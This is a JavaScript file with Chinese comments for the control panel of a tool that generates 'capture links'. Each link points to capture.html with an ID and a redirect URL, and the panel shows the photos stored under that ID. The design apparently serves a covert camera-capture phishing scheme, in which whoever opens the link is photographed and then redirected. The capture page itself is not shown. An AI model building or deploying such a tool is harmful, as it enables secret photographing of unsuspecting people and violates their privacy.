// 主要功能脚本
class PhotoManager {
    constructor() {
        this.currentPage = 0;
        this.photosPerPage = 6;
        this.currentId = '';
        this.allPhotos = [];
    }

    // 初始化应用
    init() {
        this.bindEvents();
        this.loadStoredData();
    }

    // 绑定事件监听器
    bindEvents() {
        // 生成链接按钮
        document.getElementById('generateBtn').addEventListener('click', () => {
            this.generateLink();
        });

        // 查看照片按钮
        document.getElementById('checkBtn').addEventListener('click', () => {
            this.checkPhotos();
        });

        // 复制链接按钮
        document.getElementById('copyBtn').addEventListener('click', () => {
            this.copyLink();
        });

        // 模态框关闭按钮
        document.querySelector('.close').addEventListener('click', () => {
            this.closeModal();
        });

        // 点击模态框背景关闭
        document.getElementById('photoViewer').addEventListener('click', (e) => {
            if (e.target.id === 'photoViewer') {
                this.closeModal();
            }
        });

        // 照片查看器内的按钮
        document.getElementById('prevBtn').addEventListener('click', () => {
            this.previousPage();
        });

        document.getElementById('nextBtn').addEventListener('click', () => {
            this.nextPage();
        });

        document.getElementById('clearBtn').addEventListener('click', () => {
            this.clearPhotos();
        });

        // 输入框回车事件
        document.getElementById('myid').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.generateLink();
            }
        });

        document.getElementById('url').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.generateLink();
            }
        });
    }

    // 生成拍摄链接
    generateLink() {
        const myid = document.getElementById('myid').value.trim();
        const url = document.getElementById('url').value.trim();

        if (!myid) {
            this.showMessage('请输入ID！', 'error');
            return;
        }

        if (!url) {
            this.showMessage('请输入跳转地址！', 'error');
            return;
        }

        try {
            // 验证URL格式
            new URL(url);
        } catch (e) {
            this.showMessage('请输入有效的网址！', 'error');
            return;
        }

        // 构建拍摄链接
        const baseUrl = window.location.origin + window.location.pathname.replace('index.html', '');
        const captureUrl = `${baseUrl}capture.html?id=${encodeURIComponent(myid)}&url=${encodeURIComponent(url)}`;
        
        // 显示生成的链接
        const linkElement = document.getElementById('generatedLink');
        const copyBtn = document.getElementById('copyBtn');
        
        linkElement.innerHTML = `<a href="${captureUrl}" target="_blank">${captureUrl}</a>`;
        linkElement.style.color = '#667eea';
        linkElement.style.fontWeight = 'bold';
        
        copyBtn.style.display = 'inline-block';
        
        this.showMessage('链接生成成功！', 'success');
    }

    // 复制链接到剪贴板
    async copyLink() {
        const linkElement = document.getElementById('generatedLink');
        const linkText = linkElement.textContent || linkElement.innerText;
        
        try {
            await navigator.clipboard.writeText(linkText);
            this.showMessage('链接已复制到剪贴板！', 'success');
        } catch (err) {
            // 降级方案
            const textArea = document.createElement('textarea');
            textArea.value = linkText;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            this.showMessage('链接已复制到剪贴板！', 'success');
        }
    }

    // 查看照片
    checkPhotos() {
        const myid = document.getElementById('myid').value.trim();
        
        if (!myid) {
            this.showMessage('请输入ID！', 'error');
            return;
        }

        this.currentId = myid;
        this.loadPhotos();
        this.showModal();
    }

    // 加载照片数据
    loadPhotos() {
        this.allPhotos = [];
        const keys = Object.keys(localStorage);
        
        // 筛选出对应ID的照片
        keys.forEach(key => {
            if (key.startsWith(`photo_${this.currentId}_`)) {
                const imageData = localStorage.getItem(key);
                const timestamp = parseInt(key.split('_')[2]);
                this.allPhotos.push({
                    key: key,
                    data: imageData,
                    timestamp: timestamp,
                    date: new Date(timestamp).toLocaleString('zh-CN')
                });
            }
        });

        // 按时间倒序排列
        this.allPhotos.sort((a, b) => b.timestamp - a.timestamp);
        this.currentPage = 0;
        this.displayPhotos();
    }

    // 显示照片
    displayPhotos() {
        const container = document.getElementById('photoContainer');
        const prevBtn = document.getElementById('prevBtn');
        const nextBtn = document.getElementById('nextBtn');
        
        if (this.allPhotos.length === 0) {
            container.innerHTML = `
                <div style="text-align: center; padding: 40px;">
                    <p style="font-size: 18px; color: #666;">该ID下没有任何照片</p>
                    <div class="loading-spinner"></div>
                </div>
            `;
            prevBtn.disabled = true;
            nextBtn.disabled = true;
            return;
        }

        // 计算分页
        const startIndex = this.currentPage * this.photosPerPage;
        const endIndex = Math.min(startIndex + this.photosPerPage, this.allPhotos.length);
        const currentPhotos = this.allPhotos.slice(startIndex, endIndex);

        // 生成照片网格
        let html = '<div class="photo-grid">';
        currentPhotos.forEach(photo => {
            html += `
                <div class="photo-item">
                    <img src="${photo.data}" alt="拍摄照片" loading="lazy">
                    <div class="timestamp">${photo.date}</div>
                </div>
            `;
        });
        html += '</div>';

        // 添加分页信息
        const totalPages = Math.ceil(this.allPhotos.length / this.photosPerPage);
        html += `
            <div class="pagination">
                <span>第 ${this.currentPage + 1} 页，共 ${totalPages} 页</span>
            </div>
        `;

        container.innerHTML = html;

        // 更新按钮状态
        prevBtn.disabled = this.currentPage === 0;
        nextBtn.disabled = endIndex >= this.allPhotos.length;
    }

    // 上一页
    previousPage() {
        if (this.currentPage > 0) {
            this.currentPage--;
            this.displayPhotos();
        }
    }

    // 下一页
    nextPage() {
        const totalPages = Math.ceil(this.allPhotos.length / this.photosPerPage);
        if (this.currentPage < totalPages - 1) {
            this.currentPage++;
            this.displayPhotos();
        }
    }

    // 清空照片
    clearPhotos() {
        if (this.allPhotos.length === 0) {
            this.showMessage('没有照片可删除！', 'error');
            return;
        }

        if (confirm('确定要清空该ID下的所有照片吗？此操作不可恢复！')) {
            // 删除对应ID的所有照片
            this.allPhotos.forEach(photo => {
                localStorage.removeItem(photo.key);
            });
            
            this.showMessage('照片已清空！', 'success');
            this.loadPhotos(); // 重新加载
        }
    }

    // 显示模态框
    showModal() {
        document.getElementById('photoViewer').style.display = 'block';
        document.body.style.overflow = 'hidden';
    }

    // 关闭模态框
    closeModal() {
        document.getElementById('photoViewer').style.display = 'none';
        document.body.style.overflow = 'auto';
    }

    // 显示消息提示
    showMessage(message, type = 'info') {
        // 移除现有的消息
        const existingMessage = document.querySelector('.message-toast');
        if (existingMessage) {
            existingMessage.remove();
        }

        // 创建新的消息元素
        const messageDiv = document.createElement('div');
        messageDiv.className = `message-toast ${type}-message`;
        messageDiv.textContent = message;
        
        // 添加样式
        Object.assign(messageDiv.style, {
            position: 'fixed',
            top: '20px',
            right: '20px',
            padding: '15px 25px',
            borderRadius: '8px',
            color: 'white',
            fontWeight: 'bold',
            zIndex: '9999',
            boxShadow: '0 4px 12px rgba(0,0,0,0.3)',
            animation: 'slideInRight 0.3s ease'
        });

        // 根据类型设置背景色
        switch(type) {
            case 'success':
                messageDiv.style.background = 'linear-gradient(135deg, #4CAF50, #45a049)';
                break;
            case 'error':
                messageDiv.style.background = 'linear-gradient(135deg, #f44336, #d32f2f)';
                break;
            default:
                messageDiv.style.background = 'linear-gradient(135deg, #2196f3, #1976d2)';
        }

        // 添加动画样式
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideInRight {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes fadeOut {
                from { opacity: 1; }
                to { opacity: 0; }
            }
        `;
        document.head.appendChild(style);

        document.body.appendChild(messageDiv);

        // 3秒后自动消失
        setTimeout(() => {
            messageDiv.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (messageDiv.parentNode) {
                    messageDiv.parentNode.removeChild(messageDiv);
                }
            }, 300);
        }, 3000);
    }

    // 加载存储的数据
    loadStoredData() {
        // 可以在这里加载一些预设数据或用户偏好设置
        console.log('PhotoManager initialized');
    }

    // 清理过期数据
    cleanupOldData() {
        const keys = Object.keys(localStorage);
        const sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
        
        keys.forEach(key => {
            if (key.startsWith('photo_')) {
                const timestamp = parseInt(key.split('_')[2]);
                if (timestamp < sevenDaysAgo) {
                    localStorage.removeItem(key);
                }
            }
        });
    }
}

// 页面加载完成后初始化
document.addEventListener('DOMContentLoaded', function() {
    const photoManager = new PhotoManager();
    photoManager.init();
    
    // 定期清理过期数据
    setInterval(() => {
        photoManager.cleanupOldData();
    }, 24 * 60 * 60 * 1000); // 每24小时清理一次
    
    // 页面可见性变化时也进行清理
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
            photoManager.cleanupOldData();
        }
    });
});

// 添加键盘快捷键支持
document.addEventListener('keydown', function(e) {
    // ESC键关闭模态框
    if (e.key === 'Escape') {
        const modal = document.getElementById('photoViewer');
        if (modal.style.display === 'block') {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }
    
    // Enter键快速生成链接
    if (e.key === 'Enter' && (e.target.id === 'myid' || e.target.id === 'url')) {
        document.getElementById('generateBtn').click();
    }
});